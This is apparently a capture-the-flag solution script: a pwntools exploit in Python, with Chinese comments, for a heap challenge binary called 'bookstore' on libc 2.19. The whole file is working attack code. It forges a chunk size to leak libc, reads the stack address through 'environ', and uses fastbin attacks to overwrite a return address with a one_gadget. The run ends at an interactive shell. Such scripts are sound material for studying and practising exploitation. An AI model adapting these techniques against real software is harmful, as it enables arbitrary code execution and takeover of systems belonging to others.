#!usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

#context(os='linux', arch='amd64', log_level='debug')
p = process("./bookstore")
libc = ELF("./libc-2.19.so")

def add(name,size,data):
    p.recvuntil("choice:\n")
    p.sendline(str(1)+"\x00"*0x7)   # 覆盖掉标号变量后面的0xa换行符
    p.recvuntil("author name?\n")
    p.sendline(name)
    p.recvuntil("book name?\n")
    p.sendline(str(size))
    p.recvuntil("book?\n")
    p.sendline(data)

def show(idx):
    p.recvuntil("choice:\n")
    p.sendline(str(3))
    p.recvuntil("sell?\n")
    p.sendline(str(idx))

def dele(idx):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("sell?\n")
    p.sendline(str(idx))

def g(p):
    raw_input()
    gdb.attach(p)
    raw_input()

###  伪造0xc1大小堆块，泄露libc地址，及环境变量env地址，one_gadget地址

add("a"*8+"\x31",0x10,"a")  # 0
add("b",0x50,"b")  # 1
add("c",0x50,"c")  # 2
add("d",0x50,"d")  # 3
dele(0)

add("c",0,p64(0)*3+p64(0xc1))
dele(1)
add("b",0x50,"b"*8)
show(1)
p.recvuntil("bbbbbbbb")
libc_base = u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-264-0x3c2760
print "libc : " +hex(libc_base)

env=libc_base+ libc.symbols['environ']
one_gadget=libc_base+0xea36d
print "env : " +hex(env)
print "one_gadget : " +hex(one_gadget)

add("b",0x50,"f"*8)  # 4

###  fastbin_attack控制位于bss段的book，修改bookname指针为env，泄露栈地址

add("a",0x10,"aaaaaaa")  # 5 
add("a",0x20,"aaaaaaa")  # 6
add("a",0x20,"bbbbbbb")  # 7

dele(5)
dele(6)
add("d",0,p64(0)*3+p64(0x31)+p64(0x602060))
#g(p)
add("f",0x20,"s")
add("Z",0x20,p64(0)*2+p64(env))  # 8
show(0)
p.recvuntil("Bookname:")
stack=u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))-0x110
print "stack : "+ hex(stack)

###  利用0x31编号，fastbin_attack控制返回地址栈附近，写入one_gadegt.

add("a",0x10,"aaaaaaa")  # 9
add("a",0x20,"aaaaaaa")  # 10
add("a",0x20,"bbbbbbb")  # 11

dele(9)
dele(10)

add("s",0,p64(0)*3+p64(0x31)+p64(stack))
add("B",0x20,"2"*0x10)
g(p)
add("h",0x20,p64(0)+p64(0)+p64(one_gadget)) 

### 退出 ，getshell

p.recvuntil("choice:")
p.sendline(str(4))

p.interactive()
